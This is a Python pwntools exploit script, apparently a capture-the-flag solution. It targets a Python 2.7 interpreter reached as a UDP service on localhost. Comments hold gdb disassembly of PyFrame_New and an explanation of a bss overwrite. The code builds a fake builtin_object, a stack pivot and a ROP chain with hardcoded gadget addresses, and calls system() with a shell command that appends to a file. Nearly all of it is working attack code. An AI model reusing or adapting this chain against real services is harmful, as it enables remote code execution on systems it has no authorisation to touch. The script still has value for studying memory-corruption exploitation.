from pwn import *
import requests

# written by konata

#    0x0000000000527104 <+468>:	mov    rbx,QWORD PTR [rip+0x2bd5bd]        # 0x7e46c8 <free_list>
#    0x000000000052710b <+475>:	mov    rdx,QWORD PTR [rdx+0x10]
#    0x000000000052710f <+479>:	add    rdx,QWORD PTR [rax+0x10]
#    0x0000000000527113 <+483>:	movsxd rsi,esi
#    0x0000000000527116 <+486>:	add    rsi,rdx
#    0x0000000000527119 <+489>:	test   rbx,rbx
#    0x000000000052711c <+492>:	je     0x527220 <PyFrame_New+752>
#    0x0000000000527122 <+498>:	sub    DWORD PTR [rip+0x2bd597],0x1        # 0x7e46c0 <numfree>
# => 0x0000000000527129 <+505>:	cmp    rsi,QWORD PTR [rbx+0x10]
#    0x000000000052712d <+509>:	mov    rax,QWORD PTR [rbx+0x18]
#    0x0000000000527131 <+513>:	mov    QWORD PTR [rip+0x2bd590],rax        # 0x7e46c8 <free_list>
#    0x0000000000527138 <+520>:	jg     0x5271e0 <PyFrame_New+688>
#    0x000000000052713e <+526>:	mov    QWORD PTR [rbx],0x1
#    0x0000000000527145 <+533>:	mov    QWORD PTR [rbx+0x20],r12
#    0x0000000000527149 <+537>:	movsxd rax,DWORD PTR [r12+0x14]
#    0x000000000052714e <+542>:	lea    rdi,[rbx+0x178]
#    0x0000000000527155 <+549>:	add    rax,rdx
#    0x0000000000527158 <+552>:	lea    rdx,[rax*8+0x0]
#    0x0000000000527160 <+560>:	test   rax,rax
#    0x0000000000527163 <+563>:	lea    rcx,[rdi+rdx*1]
#    0x0000000000527167 <+567>:	mov    QWORD PTR [rbx+0x40],rcx
#    0x000000000052716b <+571>:	jle    0x52717e <PyFrame_New+590>
#    0x000000000052716d <+573>:	xor    esi,esi
#    0x000000000052716f <+575>:	mov    QWORD PTR [rsp+0x8],rcx
#    0x0000000000527174 <+580>:	call   0x413850 <memset@plt>
#    0x0000000000527179 <+585>:	mov    rcx,QWORD PTR [rsp+0x8]
#    0x000000000052717e <+590>:	mov    QWORD PTR [rbx+0x38],0x0
#    0x0000000000527186 <+598>:	mov    QWORD PTR [rbx+0x50],0x0
#    0x000000000052718e <+606>:	mov    QWORD PTR [rbx+0x68],0x0
#    0x0000000000527196 <+614>:	mov    QWORD PTR [rbx+0x60],0x0
#    0x000000000052719e <+622>:	mov    QWORD PTR [rbx+0x58],0x0
#    0x00000000005271a6 <+630>:	jmp    0x526fd3 <PyFrame_New+163>
#    0x00000000005271ab <+635>:	nop    DWORD PTR [rax+rax*1+0x0]
#    0x00000000005271b0 <+640>:	mov    rbp,QWORD PTR [r13+0x28]
#    0x00000000005271b4 <+644>:	jmp    0x526fac <PyFrame_New+124>
#    0x00000000005271b9 <+649>:	nop    DWORD PTR [rax+0x0]
#    0x00000000005271c0 <+656>:	sub    QWORD PTR [rbx],0x1
#    0x00000000005271c4 <+660>:	jne    0x5270d0 <PyFrame_New+416>
#    0x00000000005271ca <+666>:	mov    rax,QWORD PTR [rbx+0x8]
#    0x00000000005271ce <+670>:	mov    rdi,rbx
#    0x00000000005271d1 <+673>:	call   QWORD PTR [rax+0x30]

def main():
    resp = requests.get(f"http://localhost:7124/open/0")
    port = int(resp.content)
    io = remote('localhost', port, typ='udp')

    # 0x00000000004a9f69: leave; add rsp, 8; xor eax, eax; pop rbx; pop rbp; ret; 
    pivot = 0x4a9f69

    pop_rdi = 0x4144b2
    system = 0x413780

    builtin_object = b''.join([
        p64(0x41414141),
        p64(0x7e4568-0x78+0x10),
        p64(pivot),
        p64(0x43434343),
        p64(pop_rdi),
        p64(0x7e45a8), # address of the cmd
        p64(system),
        p64(0x41414141),
        b'echo "Hallo" >> /app/storage/hallo.he\x00',
    ])

    payload = b''.join([
        builtin_object.ljust(0x150, b'A'),
        
        # Bug gives us an ability to overwrite part of the bss
        # section of python binary. The most interesting object
        # is builtin_object because it has some chain of
        # links that eventually points to the function pointer and
        # then call it. Every link in this chain is controlled by us
        #
        # https://github.com/python/cpython/blob/2.7/Objects/frameobject.c#L678
        # https://github.com/python/cpython/blob/226a012d1cd61f42ecd3056c554922f359a1a35d/Objects/dictobject.c#L1409
        # https://github.com/python/cpython/blob/32bd68c839adb7b42af12366ab0892303115d1d1/Objects/object.c#L770
        #
        # ----- Memory view -----
        # 0x7e46b8 <builtin_object>
        # 0x7e46c8 <free_list>
        p64(0x7e4568), # builtin_object pointer
    ]) 

    io.send(payload)
    io.interactive()


if __name__ == '__main__':
    main()